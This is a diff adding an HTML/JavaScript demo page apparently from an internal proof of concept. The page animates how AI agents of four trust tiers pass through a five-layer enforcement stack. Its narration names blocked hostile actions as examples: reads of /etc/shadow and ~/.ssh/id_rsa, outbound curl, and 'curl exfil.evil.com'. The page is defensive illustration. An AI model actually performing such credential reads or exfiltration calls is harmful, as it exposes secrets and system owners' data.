@@ -1,0 +1,925 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Agentic Security Platform — Five-Layer Enforcement Stack</title>
+<style>
+  :root {
+    --blocked: #880044;
+    --sovereign: #1a7a3a;
+    --verified: #0066cc;
+    --untrusted: #cc4400;
+    --layer-bg: #1a1a2e;
+    --layer-border: #2a2a4e;
+    --pass: #00cc66;
+    --deny: #ee3333;
+    --throttle: #ff9900;
+    --text: #e0e0e0;
+    --text-dim: #888;
+    --bg: #0d0d1a;
+    --card: #16162a;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  .header {
+    text-align: center;
+    padding: 24px 20px 8px;
+  }
+
+  .header h1 {
+    font-size: 22px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+  }
+
+  .header p {
+    color: var(--text-dim);
+    font-size: 13px;
+    margin-top: 4px;
+  }
+
+  .controls {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    padding: 16px;
+    flex-wrap: wrap;
+  }
+
+  .controls button {
+    padding: 8px 20px;
+    border: 1px solid var(--layer-border);
+    border-radius: 6px;
+    background: var(--card);
+    color: var(--text);
+    cursor: pointer;
+    font-size: 13px;
+    transition: all 0.2s;
+  }
+
+  .controls button:hover { border-color: #555; }
+  .controls button.active { border-color: var(--pass); color: var(--pass); }
+  .controls button.scenario-breach { border-color: var(--deny); color: var(--deny); }
+
+  .main {
+    display: flex;
+    max-width: 1200px;
+    margin: 0 auto;
+    padding: 0 20px 40px;
+    gap: 24px;
+  }
+
+  .stack-area {
+    flex: 1;
+    min-width: 0;
+  }
+
+  .sidebar {
+    width: 240px;
+    flex-shrink: 0;
+  }
+
+  .agents-row {
+    display: flex;
+    justify-content: space-around;
+    margin-bottom: 16px;
+    position: relative;
+  }
+
+  .agent {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 6px;
+    opacity: 0.4;
+    transition: opacity 0.5s;
+  }
+
+  .agent.active { opacity: 1; }
+
+  .agent-icon {
+    width: 48px;
+    height: 48px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 20px;
+    font-weight: 700;
+    position: relative;
+  }
+
+  .agent-icon.blocked { background: var(--blocked); }
+  .agent-icon.sovereign { background: var(--sovereign); }
+  .agent-icon.verified { background: var(--verified); }
+  .agent-icon.untrusted { background: var(--untrusted); }
+
+  .agent-name { font-size: 11px; font-weight: 600; }
+  .agent-tier { font-size: 10px; color: var(--text-dim); }
+
+  .layer {
+    background: var(--layer-bg);
+    border: 1px solid var(--layer-border);
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    position: relative;
+    transition: all 0.4s;
+    overflow: hidden;
+  }
+
+  .layer::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    opacity: 0;
+    transition: opacity 0.4s;
+    pointer-events: none;
+  }
+
+  .layer.pass::before { background: rgba(0, 204, 102, 0.08); opacity: 1; border: 1px solid var(--pass); border-radius: 8px; }
+  .layer.deny::before { background: rgba(238, 51, 51, 0.08); opacity: 1; border: 1px solid var(--deny); border-radius: 8px; }
+  .layer.throttle::before { background: rgba(255, 153, 0, 0.08); opacity: 1; border: 1px solid var(--throttle); border-radius: 8px; }
+
+  .layer-id {
+    width: 36px;
+    height: 36px;
+    border-radius: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 700;
+    flex-shrink: 0;
+    background: var(--card);
+    border: 1px solid var(--layer-border);
+  }
+
+  .layer-info { flex: 1; min-width: 0; }
+  .layer-name { font-size: 14px; font-weight: 600; }
+  .layer-desc { font-size: 11px; color: var(--text-dim); margin-top: 2px; }
+
+  .layer-result {
+    font-size: 12px;
+    font-weight: 600;
+    padding: 4px 10px;
+    border-radius: 4px;
+    opacity: 0;
+    transition: opacity 0.3s;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+
+  .layer-result.visible { opacity: 1; }
+  .layer-result.pass { color: var(--pass); background: rgba(0, 204, 102, 0.15); }
+  .layer-result.deny { color: var(--deny); background: rgba(238, 51, 51, 0.15); }
+  .layer-result.throttle { color: var(--throttle); background: rgba(255, 153, 0, 0.15); }
+
+  .packet {
+    position: absolute;
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    opacity: 0;
+    z-index: 10;
+    transition: none;
+  }
+
+  .packet.sovereign { background: var(--sovereign); box-shadow: 0 0 8px var(--sovereign); }
+  .packet.verified { background: var(--verified); box-shadow: 0 0 8px var(--verified); }
+  .packet.untrusted { background: var(--untrusted); box-shadow: 0 0 8px var(--untrusted); }
+
+  .cross-cutting {
+    margin-top: 16px;
+  }
+
+  .cross-card {
+    background: var(--card);
+    border: 1px solid var(--layer-border);
+    border-radius: 8px;
+    padding: 12px 14px;
+    margin-bottom: 8px;
+    transition: all 0.4s;
+  }
+
+  .cross-card.active-signal {
+    border-color: var(--pass);
+  }
+
+  .cross-card.alert-signal {
+    border-color: var(--deny);
+  }
+
+  .cross-card h3 {
+    font-size: 12px;
+    font-weight: 600;
+    margin-bottom: 4px;
+  }
+
+  .cross-card p {
+    font-size: 11px;
+    color: var(--text-dim);
+    line-height: 1.5;
+  }
+
+  .cross-card .status {
+    display: inline-block;
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 3px;
+    margin-top: 6px;
+    font-weight: 600;
+  }
+
+  .status.green { background: rgba(0, 204, 102, 0.15); color: var(--pass); }
+  .status.red { background: rgba(238, 51, 51, 0.15); color: var(--deny); }
+  .status.orange { background: rgba(255, 153, 0, 0.15); color: var(--throttle); }
+  .status.dim { background: rgba(255,255,255,0.05); color: var(--text-dim); }
+
+  .narration {
+    background: var(--card);
+    border: 1px solid var(--layer-border);
+    border-radius: 8px;
+    padding: 14px 18px;
+    margin-top: 12px;
+    min-height: 60px;
+  }
+
+  .narration h3 {
+    font-size: 11px;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    margin-bottom: 6px;
+  }
+
+  .narration p {
+    font-size: 13px;
+    line-height: 1.6;
+  }
+
+  .token-display {
+    background: #0a0a15;
+    border: 1px solid var(--layer-border);
+    border-radius: 6px;
+    padding: 10px 14px;
+    margin-top: 8px;
+    font-family: 'SF Mono', 'Fira Code', monospace;
+    font-size: 10px;
+    line-height: 1.5;
+    color: var(--text-dim);
+    display: none;
+  }
+
+  .token-display.visible { display: block; }
+  .token-display .key { color: #7aa2f7; }
+  .token-display .str { color: #9ece6a; }
+  .token-display .num { color: #ff9e64; }
+
+  .overview {
+    max-width: 1200px;
+    margin: 0 auto 16px;
+    padding: 0 20px;
+  }
+
+  .overview-box {
+    background: var(--card);
+    border: 1px solid var(--layer-border);
+    border-radius: 8px;
+    padding: 16px 20px;
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 16px;
+    transition: max-height 0.4s, opacity 0.4s, padding 0.4s;
+    overflow: hidden;
+  }
+
+  .overview-box.collapsed {
+    max-height: 0;
+    opacity: 0;
+    padding: 0 20px;
+    border: none;
+  }
+
+  .overview-col h3 {
+    font-size: 12px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    border-bottom: 1px solid var(--layer-border);
+    padding-bottom: 4px;
+  }
+
+  .overview-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 8px;
+    margin-bottom: 6px;
+    font-size: 12px;
+    line-height: 1.5;
+  }
+
+  .overview-item .label {
+    font-weight: 600;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+
+  .overview-item .desc {
+    color: var(--text-dim);
+  }
+
+  .overview-toggle {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 8px;
+  }
+
+  .overview-toggle button {
+    background: none;
+    border: none;
+    color: var(--text-dim);
+    font-size: 11px;
+    cursor: pointer;
+    padding: 4px 12px;
+  }
+
+  .overview-toggle button:hover { color: var(--text); }
+
+  .sidebar-label {
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-dim);
+    margin-bottom: 8px;
+    padding-bottom: 4px;
+    border-bottom: 1px solid var(--layer-border);
+  }
+
+  .legend {
+    display: flex;
+    justify-content: center;
+    gap: 20px;
+    padding: 8px;
+    margin-bottom: 8px;
+  }
+
+  .legend-item {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 11px;
+    color: var(--text-dim);
+  }
+
+  .legend-dot {
+    width: 8px;
+    height: 8px;
+    border-radius: 50%;
+  }
+
+  @media (max-width: 800px) {
+    .main { flex-direction: column; }
+    .sidebar { width: 100%; }
+  }
+
+  @keyframes pulse-glow {
+    0%, 100% { box-shadow: 0 0 4px currentColor; }
+    50% { box-shadow: 0 0 16px currentColor; }
+  }
+
+  .layer.active-anim {
+    animation: pulse-glow 0.6s ease;
+  }
+
+  .connector {
+    width: 2px;
+    height: 8px;
+    background: var(--layer-border);
+    margin: 0 auto;
+  }
+
+  .flow-arrow {
+    text-align: center;
+    color: var(--text-dim);
+    font-size: 10px;
+    margin: 2px 0;
+  }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>Agentic Security Platform — Five-Layer Enforcement Stack</h1>
+  <p>Trust Tiers PoC · Phase 2.5 · Red Hat Internal</p>
+</div>
+
+<div class="controls">
+  <button id="btn-blocked" onclick="runScenario('blocked')" style="border-color:var(--blocked);color:var(--blocked)">MalBot (Blocked)</button>
+  <button id="btn-sovereign" onclick="runScenario('sovereign')">SOC Sentinel (Sovereign)</button>
+  <button id="btn-verified" onclick="runScenario('verified')">DevAssist (Verified)</button>
+  <button id="btn-untrusted" onclick="runScenario('untrusted')">PluginX (Untrusted)</button>
+  <button id="btn-delegation" onclick="runScenario('delegation')">Delegation Chain</button>
+  <button id="btn-breach" class="scenario-breach" onclick="runScenario('breach')">Breach Response</button>
+</div>
+
+<div class="overview" id="overview-section">
+  <div class="overview-box" id="overview-box">
+    <div class="overview-col">
+      <h3>How to Read This</h3>
+      <div class="overview-item">
+        <div><span class="label">Center stack:</span> <span class="desc">Five enforcement layers (L1–L5). Every agent request flows top to bottom. Any layer can deny.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label">Right sidebar:</span> <span class="desc">Cross-cutting systems that inform the layers — attestation, orchestrator intent, circuit breaker, behavioral detector, delegation chain.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label">Narration box:</span> <span class="desc">Below the stack — explains what's happening at each step as the animation plays.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label">Token display:</span> <span class="desc">Shows the actual token claims issued to the agent — tier, profile, scopes, attestation status.</span></div>
+      </div>
+    </div>
+    <div class="overview-col">
+      <h3>The Five Layers</h3>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--text)">L1 DARC</span> <span class="desc">— Credential issuance. Verifies who the agent is and how it enrolled. Sets confirmation requirements per tier.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--text)">L2 WID</span> <span class="desc">— Token lifecycle. Assigns scope ceiling based on agent's role profile. Enforces delegation narrowing (privileges never widen).</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--text)">L3 Policy</span> <span class="desc">— Runtime authorization. Context-aware rules (time, severity, rate). Scopes are the ceiling; policy is the floor.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--text)">L4 Confinement</span> <span class="desc">— Two stacked mechanisms: OpenShell (namespace + syscall) and Blastwall (SELinux MAC + MLS/MCS). Either works alone; both together = defense in depth.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--text)">L5 Audit</span> <span class="desc">— Logging + response. Detects anomalies (policy violations AND permitted-but-wrong behavior). Triggers circuit breaker and revocation.</span></div>
+      </div>
+    </div>
+    <div class="overview-col">
+      <h3>Four Trust Tiers</h3>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--blocked)">Blocked</span> <span class="desc">— Known-bad, post-revocation, compliance-restricted. Zero access — enrollment denied at L1. Example: MalBot.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--untrusted)">Untrusted</span> <span class="desc">— Unknown third-party plugins. Read-only, OpenShell strict + Blastwall <code>agent_untrusted_t</code>, no delegation, full trace. Example: PluginX.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--verified)">Verified</span> <span class="desc">— Known agents (Claude, Copilot) with device pairing. Scoped write, namespace isolation, code-verified. Example: DevAssist.</span></div>
+      </div>
+      <div class="overview-item">
+        <div><span class="label" style="color:var(--sovereign)">Sovereign</span> <span class="desc">— Internal agents on IPA-enrolled hosts. Full scopes, no OpenShell sandbox, Blastwall standard audit, platform-attested. Example: SOC Sentinel.</span></div>
+      </div>
+      <div class="overview-item" style="margin-top: 8px;">
+        <div><span class="label">Key insight:</span> <span class="desc">Same endpoint, four outcomes. Agents graduate up with evidence, get demoted on breach. No per-agent config needed.</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="overview-toggle">
+  <button id="toggle-overview" onclick="toggleOverview()">▲ Hide guide</button>
+</div>
+
+<div class="legend">
+  <div class="legend-item"><div class="legend-dot" style="background:var(--pass)"></div> Pass</div>
+  <div class="legend-item"><div class="legend-dot" style="background:var(--deny)"></div> Deny</div>
+  <div class="legend-item"><div class="legend-dot" style="background:var(--throttle)"></div> Throttle / Constrained</div>
+</div>
+
+<div class="main">
+  <div class="stack-area">
+    <div class="agents-row">
+      <div class="agent" id="agent-blocked">
+        <div class="agent-icon blocked">M</div>
+        <div class="agent-name">MalBot</div>
+        <div class="agent-tier">Blocked · blocklisted</div>
+      </div>
+      <div class="agent" id="agent-sovereign">
+        <div class="agent-icon sovereign">S</div>
+        <div class="agent-name">SOC Sentinel</div>
+        <div class="agent-tier">Sovereign · ops-sentinel</div>
+      </div>
+      <div class="agent" id="agent-verified">
+        <div class="agent-icon verified">D</div>
+        <div class="agent-name">DevAssist</div>
+        <div class="agent-tier">Verified · devops-assistant</div>
+      </div>
+      <div class="agent" id="agent-untrusted">
+        <div class="agent-icon untrusted">P</div>
+        <div class="agent-name">PluginX</div>
+        <div class="agent-tier">Untrusted · unknown-plugin</div>
+      </div>
+    </div>
+
+    <div class="flow-arrow">▼</div>
+
+    <div class="layer" id="layer-l1">
+      <div class="layer-id">L1</div>
+      <div class="layer-info">
+        <div class="layer-name">DARC — Credential Issuance</div>
+        <div class="layer-desc">ahdapa AS · confirmation per tier · return confirmation code</div>
+      </div>
+      <div class="layer-result" id="result-l1"></div>
+    </div>
+
+    <div class="flow-arrow">▼</div>
+
+    <div class="layer" id="layer-l2">
+      <div class="layer-id">L2</div>
+      <div class="layer-info">
+        <div class="layer-name">WID/ahdapa — Token Lifecycle</div>
+        <div class="layer-desc">OBO daemon · scope ceiling per profile · delegation narrowing</div>
+      </div>
+      <div class="layer-result" id="result-l2"></div>
+    </div>
+
+    <div class="flow-arrow">▼</div>
+
+    <div class="layer" id="layer-l3">
+      <div class="layer-id">L3</div>
+      <div class="layer-info">
+        <div class="layer-name">Policy Engine — Runtime Authorization</div>
+        <div class="layer-desc">Cedar sidecar · AuthZEN · fast path / slow path · 6 rules</div>
+      </div>
+      <div class="layer-result" id="result-l3"></div>
+    </div>
+
+    <div class="flow-arrow">▼</div>
+
+    <div class="layer" id="layer-l4">
+      <div class="layer-id">L4</div>
+      <div class="layer-info">
+        <div class="layer-name">Execution Confinement (OpenShell + Blastwall)</div>
+        <div class="layer-desc">L4a OpenShell: namespace + syscall · L4b Blastwall: SELinux MAC + MLS/MCS (always on)</div>
+      </div>
+      <div class="layer-result" id="result-l4"></div>
+    </div>
+
+    <div class="flow-arrow">▼</div>
+
+    <div class="layer" id="layer-l5">
+      <div class="layer-id">L5</div>
+      <div class="layer-info">
+        <div class="layer-name">Audit — Structured Logging + Response</div>
+        <div class="layer-desc">OCSF pipeline · behavioral anomaly · circuit breaker · EDA</div>
+      </div>
+      <div class="layer-result" id="result-l5"></div>
+    </div>
+
+    <div class="narration" id="narration">
+      <h3>Narration</h3>
+      <p id="narration-text">Select a scenario above to see how requests flow through the enforcement stack. Each agent type produces different outcomes at each layer.</p>
+    </div>
+
+    <div class="token-display" id="token-display"></div>
+  </div>
+
+  <div class="sidebar">
+    <div class="cross-cutting">
+      <div class="sidebar-label">Cross-Cutting Systems</div>
+      <div class="cross-card" id="cc-attestation">
+        <h3>Integrity Attestation</h3>
+        <p>Sigstore → Keylime → SPIRE → IPA</p>
+        <div class="status dim" id="attest-status">IDLE</div>
+      </div>
+
+      <div class="cross-card" id="cc-intent">
+        <h3>Orchestrator Intent</h3>
+        <p>Expected behavior envelope from AAP/EDA</p>
+        <div class="status dim" id="intent-status">NO SIGNAL</div>
+      </div>
+
+      <div class="cross-card" id="cc-circuit">
+        <h3>Circuit Breaker</h3>
+        <p>Profile-level throttle/halt for swarm anomalies</p>
+        <div class="status green" id="circuit-status">CLOSED</div>
+      </div>
+
+      <div class="cross-card" id="cc-behavioral">
+        <h3>Behavioral Detector</h3>
+        <p>Rate spike · swarm · sequence · drift</p>
+        <div class="status green" id="behavioral-status">NORMAL</div>
+      </div>
+
+      <div class="cross-card" id="cc-delegation">
+        <h3>Delegation Chain</h3>
+        <p id="delegation-chain-text">No active delegation</p>
+        <div class="status dim" id="delegation-status">DEPTH: 0</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+function toggleOverview() {
+  const box = document.getElementById('overview-box');
+  const btn = document.getElementById('toggle-overview');
+  if (box.classList.contains('collapsed')) {
+    box.classList.remove('collapsed');
+    btn.textContent = '▲ Hide guide';
+  } else {
+    box.classList.add('collapsed');
+    btn.textContent = '▼ Show guide';
+  }
+}
+
+const layers = ['l1', 'l2', 'l3', 'l4', 'l5'];
+let animating = false;
+let currentTimeout = [];
+
+function clearAll() {
+  currentTimeout.forEach(t => clearTimeout(t));
+  currentTimeout = [];
+  layers.forEach(id => {
+    const el = document.getElementById(`layer-${id}`);
+    el.classList.remove('pass', 'deny', 'throttle', 'active-anim');
+    const r = document.getElementById(`result-${id}`);
+    r.classList.remove('visible', 'pass', 'deny', 'throttle');
+    r.textContent = '';
+  });
+  document.querySelectorAll('.agent').forEach(a => a.classList.remove('active'));
+  document.querySelectorAll('.controls button').forEach(b => b.classList.remove('active'));
+  document.getElementById('token-display').classList.remove('visible');
+
+  const cc = ['cc-attestation', 'cc-intent', 'cc-circuit', 'cc-behavioral', 'cc-delegation'];
+  cc.forEach(id => {
+    document.getElementById(id).classList.remove('active-signal', 'alert-signal');
+  });
+  document.getElementById('attest-status').className = 'status dim';
+  document.getElementById('attest-status').textContent = 'IDLE';
+  document.getElementById('intent-status').className = 'status dim';
+  document.getElementById('intent-status').textContent = 'NO SIGNAL';
+  document.getElementById('circuit-status').className = 'status green';
+  document.getElementById('circuit-status').textContent = 'CLOSED';
+  document.getElementById('behavioral-status').className = 'status green';
+  document.getElementById('behavioral-status').textContent = 'NORMAL';
+  document.getElementById('delegation-status').className = 'status dim';
+  document.getElementById('delegation-status').textContent = 'DEPTH: 0';
+  document.getElementById('delegation-chain-text').textContent = 'No active delegation';
+}
+
+function setLayer(id, state, text, delay) {
+  currentTimeout.push(setTimeout(() => {
+    const el = document.getElementById(`layer-${id}`);
+    el.classList.add(state, 'active-anim');
+    const r = document.getElementById(`result-${id}`);
+    r.className = `layer-result visible ${state}`;
+    r.textContent = text;
+  }, delay));
+}
+
+function setNarration(text, delay) {
+  currentTimeout.push(setTimeout(() => {
+    document.getElementById('narration-text').innerHTML = text;
+  }, delay));
+}
+
+function setCrossCard(id, cls, delay) {
+  currentTimeout.push(setTimeout(() => {
+    document.getElementById(id).classList.add(cls);
+  }, delay));
+}
+
+function setStatus(id, cls, text, delay) {
+  currentTimeout.push(setTimeout(() => {
+    const el = document.getElementById(id);
+    el.className = `status ${cls}`;
+    el.textContent = text;
+  }, delay));
+}
+
+function showToken(html, delay) {
+  currentTimeout.push(setTimeout(() => {
+    const el = document.getElementById('token-display');
+    el.innerHTML = html;
+    el.classList.add('visible');
+  }, delay));
+}
+
+function runScenario(type) {
+  clearAll();
+  animating = true;
+  document.getElementById(`btn-${type}`).classList.add('active');
+
+  const d = 600;
+
+  if (type === 'blocked') {
+    document.getElementById('agent-blocked').classList.add('active');
+
+    setNarration('<strong>Pre-enrollment assessment (Layer 0):</strong> MalBot submitted for vetting. Running static analysis — cosign signature check, blocklist lookup, dependency scan, scope request review.', 0);
+
+    setNarration('<strong>Static analysis results:</strong> Unsigned binary (no cosign signature). Origin: unknown publisher, first seen today. Scope request: <code>*:read *:write</code> — overly broad. 2 moderate CVEs in dependencies. Proceeding to dynamic analysis in sandbox.', d * 2);
+    setCrossCard('cc-attestation', 'alert-signal', d * 2);
+    setStatus('attest-status', 'red', 'UNSIGNED + OVERLY BROAD', d * 2);
+
+    setNarration('<strong>Dynamic analysis:</strong> OpenShell strict sandbox with synthetic honeypot data. MalBot attempted: <code>curl</code> outbound (blocked), read <code>~/.ssh/id_rsa</code> (blocked), read <code>/etc/shadow</code> (blocked), wrote canary token to <code>/tmp</code> (blocked). Exfiltration attempt detected.', d * 4);
+
+    showToken(
+      `<span class="key">"tool"</span>: <span class="str">"malbot-3xf91"</span>\n` +
+      `<span class="key">"risk_score"</span>: <span class="num">87</span>\n` +
+      `<span class="key">"recommendation"</span>: <span class="str" style="color:var(--deny)">"BLOCKED"</span>\n` +
+      `<span class="key">"static"</span>: {\n` +
+      `  <span class="key">"signature"</span>: <span class="str">"unsigned"</span>,\n` +
+      `  <span class="key">"scope_request"</span>: <span class="str">"overly_broad (*:read *:write)"</span>,\n` +
+      `  <span class="key">"cves"</span>: <span class="num">2</span>}\n` +
+      `<span class="key">"dynamic"</span>: {\n` +
+      `  <span class="key">"network_attempts"</span>: <span class="num">3</span>,\n` +
+      `  <span class="key">"sensitive_file_reads"</span>: <span class="str">["/etc/shadow","~/.ssh/id_rsa"]</span>,\n` +
+      `  <span class="key">"exfiltration_attempt"</span>: <span class="num">true</span>,\n` +
+      `  <span class="key">"behavioral_match"</span>: <span class="num">0.12</span>}`,
+      d * 4.5
+    );
+
+    setNarration('<strong>Assessment: risk score 87/100 → BLOCKED.</strong> Override triggers: unsigned binary, exfiltration attempt, sensitive file reads. Added to <code>agent-tier-blocked</code> IPA group.', d * 6.5);
+    setLayer('l1', 'deny', 'ENROLLMENT DENIED (403)', d * 6.5);
+
+    setNarration('No token issued. L2–L5 never reached. MalBot cannot read, write, delegate, or execute anything. <strong>Value: "No access until we know you\'re safe."</strong> The assessment caught this before any real data was exposed.', d * 8);
+
+  } else if (type === 'sovereign') {
+    document.getElementById('agent-sovereign').classList.add('active');
+
+    setNarration('SOC Sentinel enrolls via host armor + keytab. DARC confirms with <code>idp-confirmed</code> indicator. Platform-verified attestation.', 0);
+    setCrossCard('cc-attestation', 'active-signal', d * 0.5);
+    setStatus('attest-status', 'green', 'PLATFORM-VERIFIED', d * 0.5);
+    setLayer('l1', 'pass', 'HOST ARMOR + CONFIRMED', d);
+
+    setNarration('L2 issues full-scope token. Profile: ops-sentinel. Delegation depth: 3. All scopes granted.', d * 2);
+    setLayer('l2', 'pass', 'FULL SCOPES', d * 2);
+    showToken(
+      `<span class="key">"tier"</span>: <span class="str">"sovereign"</span>\n` +
+      `<span class="key">"profile"</span>: <span class="str">"ops-sentinel"</span>\n` +
+      `<span class="key">"scope"</span>: <span class="str">"incident:* infra:read infra:restart"</span>\n` +
+      `<span class="key">"attestation"</span>: <span class="str">"platform-verified"</span>\n` +
+      `<span class="key">"max_delegation_depth"</span>: <span class="num">3</span>`,
+      d * 2.5
+    );
+
+    setNarration('L3 policy: Sovereign tier passes all rules. P1 incident write at 2 AM — permitted. Fast path for non-protected resources.', d * 3.5);
+    setLayer('l3', 'pass', 'P1 WRITE AT 2AM → OK', d * 3.5);
+
+    setNarration('L4: Sovereign profile — no OpenShell sandbox. Blastwall SELinux: MLS <code>s0-s15:c0.c1023</code>, standard type enforcement. Full network, read-write filesystem.', d * 5);
+    setLayer('l4', 'pass', 'BLASTWALL ONLY', d * 5);
+
+    setNarration('L5: Standard audit logging. All layers passed. Behavioral detector baseline updated. <strong>Request complete — full access.</strong>', d * 6.5);
+    setLayer('l5', 'pass', 'LOGGED', d * 6.5);
+    setStatus('behavioral-status', 'green', 'BASELINE +1', d * 7);
+
+  } else if (type === 'verified') {
+    document.getElementById('agent-verified').classList.add('active');
+
+    setNarration('DevAssist enrolls via agentdesktop JWT + DPoP device pairing. DARC requires confirmation — user types 6-digit code.', 0);
+    setCrossCard('cc-attestation', 'active-signal', d * 0.5);
+    setStatus('attest-status', 'green', 'CODE-VERIFIED', d * 0.5);
+    setLayer('l1', 'pass', 'CONFIRMED (6-DIGIT)', d);
+
+    setNarration('L2: devops-assistant profile. Scoped to incident:read, incident:write, code:read, code:write, infra:read. No admin. Delegation depth: 1.', d * 2);
+    setLayer('l2', 'pass', 'SCOPED WRITE', d * 2);
+    showToken(
+      `<span class="key">"tier"</span>: <span class="str">"verified"</span>\n` +
+      `<span class="key">"profile"</span>: <span class="str">"devops-assistant"</span>\n` +
+      `<span class="key">"scope"</span>: <span class="str">"incident:read incident:write code:read"</span>\n` +
+      `<span class="key">"attestation"</span>: <span class="str">"code-verified"</span>\n` +
+      `<span class="key">"deny_scopes"</span>: <span class="str">"incident:admin infra:admin"</span>`,
+      d * 2.5
+    );
+
+    setNarration('L3 policy check: DevAssist writes P4 incident during business hours → <strong>PASS</strong>. But P1 write triggers severity gate → <strong>DENY</strong>. Same scope, different context.', d * 3.5);
+    setLayer('l3', 'deny', 'P1 WRITE → DENIED', d * 3.5);
+
+    setNarration('Request stopped at L3. L4-L5 not reached for this action. <strong>Scopes are ceilings, policy is the floor.</strong> DevAssist can still write P4 incidents during business hours.', d * 5);
+    setStatus('behavioral-status', 'green', 'NORMAL', d * 5.5);
+
+  } else if (type === 'untrusted') {
+    document.getElementById('agent-untrusted').classList.add('active');
+
+    setNarration('PluginX: unknown client_id, no device pairing. <code>confirmation_input=none</code>. DARC restricts to read-only scopes. No attestation evidence.', 0);
+    setStatus('attest-status', 'orange', 'NONE', d * 0.5);
+    setLayer('l1', 'pass', 'READ-ONLY SCOPES', d);
+
+    setNarration('L2: unknown-plugin profile. Read-only scopes only. No delegation (depth: 0). Deny-scopes block all write/admin/delete.', d * 2);
+    setLayer('l2', 'pass', 'READ-ONLY, NO DELEGATION', d * 2);
+    showToken(
+      `<span class="key">"tier"</span>: <span class="str">"untrusted"</span>\n` +
+      `<span class="key">"profile"</span>: <span class="str">"unknown-plugin"</span>\n` +
+      `<span class="key">"scope"</span>: <span class="str">"*:read"</span>\n` +
+      `<span class="key">"attestation"</span>: <span class="str">"none"</span>\n` +
+      `<span class="key">"max_delegation_depth"</span>: <span class="num">0</span>`,
+      d * 2.5
+    );
+
+    setNarration('L3: Read action passes policy. Rate limit enforced — max 10 requests/minute for Untrusted tier.', d * 3.5);
+    setLayer('l3', 'pass', 'READ OK · RATE LIMITED', d * 3.5);
+
+    setNarration('L4a OpenShell: Strict sandbox — no network, read-only filesystem, no execve. L4b Blastwall: SELinux <code>agent_untrusted_t</code> — no sockets, no IPC, MLS <code>s0</code>. <code>curl exfil.evil.com</code> → blocked by both.', d * 5);
+    setLayer('l4', 'throttle', 'STRICT (BOTH LAYERS)', d * 5);
+
+    setNarration('L5: Full trace audit. Every action logged with correlation ID. Behavioral baseline established. <strong>PluginX reads data safely — confined and monitored.</strong>', d * 6.5);
+    setLayer('l5', 'pass', 'FULL TRACE', d * 6.5);
+    setStatus('behavioral-status', 'green', 'MONITORING', d * 7);
+
+  } else if (type === 'delegation') {
+    document.getElementById('agent-verified').classList.add('active');
+    document.getElementById('agent-untrusted').classList.add('active');
+
+    setNarration('DevAssist (Verified) delegates to PluginX (Untrusted) via OBO token exchange. Scopes narrow at every hop.', 0);
+    setLayer('l1', 'pass', 'BOTH ENROLLED', d);
+
+    setNarration('L2 delegation: DevAssist scopes [incident:read, incident:write] ∩ PluginX scopes [*:read] = <strong>[incident:read]</strong>. Privileges never widen.', d * 2);
+    setLayer('l2', 'pass', 'NARROWED → READ ONLY', d * 2);
+
+    setCrossCard('cc-delegation', 'active-signal', d * 2.5);
+    setStatus('delegation-status', 'green', 'DEPTH: 1', d * 2.5);
+    currentTimeout.push(setTimeout(() => {
+      document.getElementById('delegation-chain-text').textContent = 'alice → DevAssist → PluginX';
+    }, d * 2.5));
+
+    showToken(
+      `<span class="key">"sub"</span>: <span class="str">"alice@CORP.LOCAL"</span>\n` +
+      `<span class="key">"act"</span>: {<span class="key">"sub"</span>: <span class="str">"DevAssist"</span>,\n` +
+      `        <span class="key">"act"</span>: {<span class="key">"sub"</span>: <span class="str">"PluginX"</span>}}\n` +
+      `<span class="key">"scope"</span>: <span class="str">"incident:read"</span>\n` +
+      `<span class="key">"delegation_path"</span>: [<span class="str">"alice"</span>, <span class="str">"DevAssist"</span>, <span class="str">"PluginX"</span>]`,
+      d * 3
+    );
+
+    setNarration('PluginX (on behalf of DevAssist) tries incident:write → <strong>DENIED</strong>. Write not in delegated scopes. Can\'t delegate up.', d * 4);
+    setLayer('l3', 'deny', 'WRITE → DENIED (NOT DELEGATED)', d * 4);
+
